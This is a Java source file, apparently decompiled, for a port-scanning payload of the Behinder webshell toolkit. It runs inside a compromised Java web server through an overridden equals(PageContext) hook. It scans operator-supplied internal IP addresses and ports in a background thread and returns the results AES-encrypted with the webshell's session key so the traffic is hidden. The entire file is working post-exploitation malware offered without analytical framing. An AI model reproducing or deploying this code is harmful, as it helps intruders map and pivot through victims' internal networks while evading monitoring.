package net.rebeyond.behinder.payload.java;

import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class Scan implements Runnable {
   public static String ipList;
   public static String portList;
   public static String taskID;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;

   public Scan(HttpSession session) {
      this.Session = session;
   }

   public Scan() {
   }

   public boolean equals(Object obj) {
      PageContext page = (PageContext)obj;
      this.Session = page.getSession();
      this.Response = page.getResponse();
      this.Request = page.getRequest();
      page.getResponse().setCharacterEncoding("UTF-8");
      HashMap result = new HashMap();
      boolean var12 = false;

      ServletOutputStream so = null;
      label77: {
         try {
            var12 = true;
            (new Thread(new Scan(this.Session))).start();
            result.put("msg", "扫描任务提交成功");
            result.put("status", "success");
            var12 = false;
            break label77;
         } catch (Exception var16) {
            result.put("msg", var16.getMessage());
            result.put("status", "fail");
            var12 = false;
         } finally {
            if (var12) {
               try {
                  so = this.Response.getOutputStream();
                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.flush();
                  so.close();
                  page.getOut().clear();
               } catch (Exception var13) {
                  var13.printStackTrace();
               }

            }
         }

         try {
            so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
         } catch (Exception var14) {
            var14.printStackTrace();
         }

         return true;
      }

      try {
         so = this.Response.getOutputStream();
         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.flush();
         so.close();
         page.getOut().clear();
      } catch (Exception var15) {
         var15.printStackTrace();
      }

      return true;
   }

   public void run() {
      try {
         String[] ips = ipList.split(",");
         String[] ports = portList.split(",");
         Map sessionObj = new HashMap();
         Map scanResult = new HashMap();
         sessionObj.put("running", "true");
         String[] var5 = ips;
         int var6 = ips.length;

         for(int var7 = 0; var7 < var6; ++var7) {
            String ip = var5[var7];
            String[] var9 = ports;
            int var10 = ports.length;

            for(int var11 = 0; var11 < var10; ++var11) {
               String port = var9[var11];

               try {
                  Socket socket = new Socket();
                  socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1000);
                  socket.close();
                  scanResult.put(ip + ":" + port, "open");
               } catch (Exception var14) {
                  scanResult.put(ip + ":" + port, "closed");
               }

               sessionObj.put("result", this.buildJson(scanResult, false));
               this.Session.setAttribute(taskID, sessionObj);
            }
         }

         sessionObj.put("running", "false");
      } catch (Exception var15) {
         var15.printStackTrace();
      }

   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getAttribute("u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private String buildJsonArray(List entityList, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      sb.append("[");
      Iterator var4 = entityList.iterator();

      while(var4.hasNext()) {
         Map entity = (Map)var4.next();
         sb.append(this.buildJson(entity, encode) + ",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("]");
      return sb.toString();
   }
}
